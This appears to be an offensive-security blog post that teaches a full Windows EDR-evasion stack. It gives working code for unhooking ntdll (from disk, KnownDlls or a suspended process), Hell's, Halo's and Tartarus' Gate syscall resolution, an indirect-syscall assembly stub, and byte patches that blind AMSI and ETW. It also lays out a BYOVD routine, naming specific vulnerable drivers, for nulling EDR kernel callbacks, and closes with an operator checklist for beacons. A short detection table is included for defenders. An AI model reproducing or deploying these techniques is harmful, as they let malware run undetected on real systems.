---
title: "The Userland EDR Bypass Stack: Unhooking, Syscalls, ETW/AMSI, and Kernel Callbacks"
description: "A comprehensive guide to the layered techniques that make up modern userland EDR evasion - restoring clean ntdll, dynamic syscall resolution via Hell's/Halo's/Tartarus' Gate, indirect syscalls, AMSI/ETW patching, and optional kernel callback removal. Theory, working code, OPSEC, and detection for each layer."
date: 2026-04-17
difficulty: Elite
tags: [edr-bypass, syscalls, unhooking, amsi, etw, hells-gate, kernel-callbacks, opsec]
---

EDR evasion at the userland layer is not one technique - it's a **stack**. Each layer closes a specific detection channel, and a mature operator uses the layers together: unhook ntdll so your own calls don't trip inline hooks, resolve syscall numbers dynamically so you're portable, execute those syscalls indirectly so your stack still looks legitimate, patch AMSI and ETW before loading tooling so PowerShell/.NET stay silent, and - only when forced - reach into the kernel to unregister the callbacks that can see everything user mode does. This post walks each layer in order, explains the theory, shows the working code, and ends with what the defender actually sees.

## Layer 0: Why Userland EDR Works

A modern EDR agent has three hands inside your running process:

1. **Inline hooks in `ntdll.dll`.** The first 5-15 bytes of selected functions (`NtOpenProcess`, `NtAllocateVirtualMemory`, `NtCreateThreadEx`, `NtProtectVirtualMemory`, a few dozen others) are replaced with a `jmp` to the agent's inspection routine. The inspection routine records telemetry, optionally blocks, then (if allowed) returns to the original function body.
2. **AMSI scanning for in-process interpreters.** PowerShell, VBScript, JScript, and .NET runtime all call `AmsiScanBuffer` on every piece of script/code they are about to execute. The AV driver gets the content in clear text. This is how one-liner "EncodedCommand" loaders get caught.
3. **ETW (Event Tracing for Windows) providers.** `Microsoft-Windows-Threat-Intelligence`, `Microsoft-Windows-Kernel-Audit-API-Calls`, and others emit events on syscall entry, DLL load, thread creation, etc. The EDR's driver subscribes and correlates.

Each layer below neutralizes one of these channels.

## Layer 1: Restoring Clean ntdll - Userland Unhooking

### The theory

When the EDR DLL loads into your process, it walks ntdll's export table and patches each function of interest. You can see this trivially with WinDbg:

```
0:000> u ntdll!NtAllocateVirtualMemory
ntdll!NtAllocateVirtualMemory:
00007ffc`3d4a1000 e9abcdf021 jmp edrdll+0x12345     ; hook!
00007ffc`3d4a1005 ...
```

If you restore those bytes with a clean copy from disk, your next syscall bypasses the hook entirely. There are three common ways to get a clean copy.

### Technique 1.a - Map from disk

```c
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
                           GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, 0, NULL);
HANDLE hMap  = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
LPVOID clean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);

// Find .text section in both clean and hooked copies
PIMAGE_DOS_HEADER dosH  = (PIMAGE_DOS_HEADER)hookedNtdll;
PIMAGE_NT_HEADERS ntH   = (PIMAGE_NT_HEADERS)((BYTE*)hookedNtdll + dosH->e_lfanew);
PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(ntH);
// (locate ".text" and copy clean bytes over hooked bytes with VirtualProtect)
```

**Downside**: `CreateFile` on `ntdll.dll` is itself watched. EDRs with file-access telemetry will flag it.

### Technique 1.b - KnownDlls section

Windows caches a mapped copy of every `KnownDll` (including ntdll) under `\KnownDlls\ntdll.dll`. Open the section object directly, no disk I/O:

```c
HANDLE hSec;
UNICODE_STRING us = { .Length = 32, .MaximumLength = 34, .Buffer = L"\\KnownDlls\\ntdll.dll" };
OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL, &us, OBJ_CASE_INSENSITIVE };
NtOpenSection(&hSec, SECTION_MAP_READ, &oa);

LPVOID clean = NULL;
SIZE_T sz = 0;
NtMapViewOfSection(hSec, NtCurrentProcess(), &clean, 0, 0, NULL, &sz,
                   ViewUnmap, 0, PAGE_READONLY);
```

Cleaner - no filesystem event. This is the technique in most mature loaders.

### Technique 1.c - Suspended donor process

Spawn a second process suspended. EDR hooks inject into the *primary* thread's execution path, so a suspended process's mapped ntdll is still clean for a brief window:

```c
STARTUPINFOA si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
               CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

// Read the remote process's ntdll before it resumes
ReadProcessMemory(pi.hProcess, remoteNtdllBase, ourBuffer, size, NULL);

TerminateProcess(pi.hProcess, 0);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
```

Most stealth, but noisy if your loader spawns a weirdly short-lived notepad.

### Comparison

| Technique | Disk I/O | File-access telemetry | Best against |
|---|---|---|---|
| Disk mapping | Yes | Visible | Basic AV |
| KnownDlls | No | None | File-monitoring EDR |
| Suspended donor | No | Process-create event | Aggressive inline hooking |

## Layer 2: Dynamic Syscall Number Resolution

Even with clean ntdll, you might want to bypass it entirely - direct syscalls from your own code cut out `ntdll.dll` as a middleman. But syscall numbers (SSNs) change between Windows builds. Hardcoding `NtOpenProcess = 0x26` breaks on the next update.

**Hell's Gate** resolves SSNs at runtime by scanning each Nt-function's first bytes. A clean syscall stub looks like:

```
4C 8B D1              mov r10, rcx
B8 XX XX 00 00        mov eax, <SSN>
F6 04 25 08 ...       test byte ptr [...], 1
75 03                 jne +3
0F 05                 syscall
C3                    ret
```

Byte 4 is `0xB8` (the `mov eax, imm32`). Bytes 5-6 are the syscall number.

### Hell's Gate - clean case

```c
DWORD HellsGate(PVOID funcAddr) {
    PBYTE p = (PBYTE)funcAddr;
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8)
        return *(DWORD*)(p + 4);
    return 0;  // hooked or unknown - use Halo's Gate
}
```

### Halo's Gate - walk neighbors when hooked

EDR replaces those first bytes with a `jmp`. The **next** Nt-function (32 bytes down in memory) is often not hooked, and SSNs are sequential in most Windows builds. So if `NtOpenProcess` is hooked but `NtOpenThread` 32 bytes later isn't, and its SSN is `0x27`, then `NtOpenProcess` is `0x27 - 1 = 0x26`.

```c
DWORD HalosGate(PVOID funcAddr) {
    PBYTE p = (PBYTE)funcAddr;

    // Try the direct read first
    if (p[0] == 0x4C && p[3] == 0xB8) return *(DWORD*)(p + 4);

    // Walk neighbors
    for (int i = 1; i < 500; i++) {
        PBYTE down = p + (i * 32);
        if (down[0] == 0x4C && down[3] == 0xB8)
            return *(DWORD*)(down + 4) - i;
        PBYTE up = p - (i * 32);
        if (up[0] == 0x4C && up[3] == 0xB8)
            return *(DWORD*)(up + 4) + i;
    }
    return 0;
}
```

### Tartarus' Gate - double-hook resilience

If **both** neighbors are hooked, Halo's Gate fails. Tartarus extends the search radius and uses the `mov r10, rcx` prefix (`4C 8B D1`) as the robust discriminator rather than the `0x4C` start byte alone, since hooks can start with the same byte by coincidence.

| Technique | Handles single hook | Handles double hook | Disk I/O |
|---|:---:|:---:|:---:|
| Hardcoded SSN | ✗ | ✗ | None |
| Hell's Gate | ✗ (clean path only) | ✗ | None |
| Halo's Gate | ✓ | ✗ | None |
| Tartarus' Gate | ✓ | ✓ | None |

## Layer 3: Indirect Syscalls - Calling Through ntdll

Direct syscalls (executing `syscall` from your own `.text`) work, but the instruction executes from a non-ntdll address - **kernel callbacks can see that**. Modern EDRs instrument the kernel to log the return address of every `syscall`. If it's not within `ntdll.dll`, that's anomalous.

**Indirect syscalls** fix this: set up registers as normal, then *jump* to the `syscall; ret` gadget that lives inside ntdll. The kernel sees a return address inside ntdll - indistinguishable from a legitimate API call. The hook in `ntdll!NtOpenProcess` is still bypassed because your jump lands past the hook's patched bytes.

### Implementation

```asm
; indirect_syscall.asm - NASM syntax
bits 64
default rel

global _indirect_syscall

section .text

_indirect_syscall:
    mov r10, rcx          ; shadow rcx - Windows x64 calling convention for syscalls
    mov eax, [rel g_ssn]  ; syscall number (filled by runtime)
    jmp [rel g_gadget]    ; jumps to ntdll's syscall;ret gadget

section .data
global g_ssn, g_gadget
g_ssn:    dd 0
g_gadget: dq 0
```

On the C side, at runtime:

```c
// Resolve SSN for target function
g_ssn = HalosGate(GetProcAddress(ntdll, "NtOpenProcess"));

// Find a syscall;ret gadget inside ntdll (there are many - any Nt-function's final two instructions)
PBYTE stub = (PBYTE)GetProcAddress(ntdll, "NtClose");
for (int i = 0; i < 32; i++) {
    if (stub[i] == 0x0F && stub[i+1] == 0x05 && stub[i+2] == 0xC3) {
        g_gadget = (DWORD64)(stub + i);
        break;
    }
}

// Now calling indirect_syscall(...) invokes NtOpenProcess with the call
// appearing (to the kernel) to originate from inside ntdll.
NTSTATUS s = indirect_syscall(&hProc, PROCESS_QUERY_INFORMATION, &oa, &cid);
```

This is the technique in **SysWhispers3**, **FreshyCalls**, and most mature loaders shipped in 2024-2026.

## Layer 4: AMSI and ETW Patching

Unhooking plus indirect syscalls defeats kernel callbacks on individual APIs - but if you're running PowerShell or .NET tooling inside the beacon, each script/assembly is scanned by AMSI before execution. And every syscall you make emits ETW events. You patch both.

### AMSI patch - 4 bytes, ring 3

```csharp
// C# version - load amsi.dll if not already, patch AmsiScanBuffer to return AMSI_RESULT_CLEAN (0)
IntPtr amsi   = LoadLibrary("amsi.dll");
IntPtr target = GetProcAddress(amsi, "AmsiScanBuffer");

byte[] patch = { 0x48, 0x31, 0xC0, 0xC3 };  // xor rax, rax ; ret
VirtualProtect(target, (UIntPtr)patch.Length, 0x40, out uint oldProt);
Marshal.Copy(patch, 0, target, patch.Length);
VirtualProtect(target, (UIntPtr)patch.Length, oldProt, out _);
```

Every subsequent `AmsiScanBuffer` call returns "clean" immediately. No content ever reaches the AV.

### ETW patch - 1 byte

`EtwEventWrite` is the user-mode ETW entry point. Return early:

```csharp
IntPtr etw = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
VirtualProtect(etw, (UIntPtr)1, 0x40, out uint oldProt);
Marshal.Copy(new byte[] { 0xC3 }, 0, etw, 1);  // ret
VirtualProtect(etw, (UIntPtr)1, oldProt, out _);
```

### Ordering matters

- **Patch AMSI/ETW BEFORE loading tooling.** Once PowerShell has scanned a payload and reported it, it's too late.
- **Patch ETW before AMSI** - because AMSI itself emits an ETW event on `AmsiScanBuffer` entry.
- **Some environments revert patches.** Sophos and CrowdStrike periodically re-check `AmsiScanBuffer` bytes. Use **hardware breakpoint hooking** of `AmsiScanBuffer` instead - no bytes modified, still returns clean.

## Layer 5: Kernel Callback Removal (The Nuclear Option)

Everything above keeps the EDR's userland components blind. But the EDR's **kernel driver** still sees every process created, thread spawned, image loaded, handle opened - via the Object Manager callbacks it registered at boot.

Removing those callbacks requires a read/write primitive in Ring 0. Most operators get it via a **vulnerable signed driver** (BYOVD):

- Dell `dbutil.sys`
- MSI `RTCore64.sys`
- GIGABYTE `gdrv.sys`
- Intel `iqvw64e.sys` / `NAL`

The driver exposes an arbitrary kernel read/write primitive via IOCTL. From a userland application, open a handle to the driver, issue IOCTLs to:

1. Locate `PspCreateProcessNotifyRoutineEx` (undocumented, found via pattern scan or offset from `PsSetCreateProcessNotifyRoutineEx`).
2. Walk the 64-entry callback array.
3. Resolve each callback's target driver name.
4. NULL-out the entries belonging to the EDR driver.

```c
// Simplified - real implementation needs to handle ExFastRef tagging on the pointers
for (int i = 0; i < 64; i++) {
    PVOID slot = KernelRead(callbackArray + i * sizeof(PVOID));
    PVOID callback = (PVOID)((ULONG_PTR)slot & ~0xFULL);  // strip ExFastRef flags
    if (!callback) continue;

    char driverName[64];
    ResolveDriverName(callback, driverName, sizeof(driverName));
    if (strstr(driverName, "edrdrv.sys") || strstr(driverName, "crowdstrike")) {
        KernelWrite(callbackArray + i * sizeof(PVOID), 0);  // blind it
    }
}
```

The same trick works for:
- `PspLoadImageNotifyRoutine` (DLL load visibility)
- `PspCreateThreadNotifyRoutine` (thread creation)
- `CallbackListHead` of `ObRegisterCallbacks` targets (handle operations)

### The catch

- **HVCI / VBS** prevents unsigned kernel code - you can still issue IOCTLs to a signed driver you loaded, but you can't load your own rootkit.
- **PatchGuard / KPP** periodically validates SSDT, IDT, and select structures. Callback arrays aren't formally in the protected set, but Windows 11 24H2 tightened this significantly.
- **Microsoft's vulnerable driver blocklist** (HVCI-enforced in 11 24H2+) makes the historically reliable BYOVD drivers unusable on modern systems.
- **Loud**: loading a kernel driver generates an Event 6 in the System log that every SOC should alert on.

Use this as a last resort - after userland evasion has been fully exhausted and you need to hide from a specific EDR you know you can't beat otherwise.

## What the Defender Actually Sees

Detection engineers don't need to block every layer - they need to detect *any* of them. A well-instrumented environment picks up:

| Layer | Detection vector |
|---|---|
| Disk mapping of ntdll | File-access event 4663 on `ntdll.dll` from a non-system process |
| KnownDlls mapping | `NtOpenSection` on `\KnownDlls\ntdll.dll` from userland is rare enough to baseline |
| Suspended donor process | Short-lived `notepad.exe` + `ReadProcessMemory` pattern |
| Hell's Gate family | Syscall from a non-ntdll return address (kernel instrumentation) |
| Indirect syscalls | Stack walk shows a call from non-ntdll module just before the gadget |
| AMSI patch | Byte hash of `AmsiScanBuffer` deviates from baseline |
| ETW patch | ETW events suddenly stop from a running process |
| Kernel callback removal | Driver load event (6/7045) + callback array integrity check fails |

The operator's job is to minimize each of these. The defender's job is to monitor enough of them that skipping one leaves another still visible. Mature engagements turn into a choreography where both sides know the moves - and the winner is whoever executed the prep better.

## Recommended Operator Order

In practice, every beacon should do this on load, in this exact sequence, before running any capability:

1. **Disable ETW** (1-byte patch, or HWBP)
2. **Disable AMSI** (4-byte patch, or HWBP)
3. **Restore ntdll** via KnownDlls section (cleanest)
4. **Set up Halo's Gate** for every syscall you'll make
5. **Execute capabilities** using indirect syscalls
6. **Kernel callback removal** only if you confirmed the EDR is one that requires it (e.g. CrowdStrike on a hardened workstation)

Implement once, ship as a reusable BOF library, chain into every engagement. The days of "direct syscalls and you're fine" are over; in 2026 you need the full stack.

> EDR bypass isn't a trick. It's a set of maintenance activities you perform on your own process, every time, to keep it behaving like the kind of process the defender expects to see.
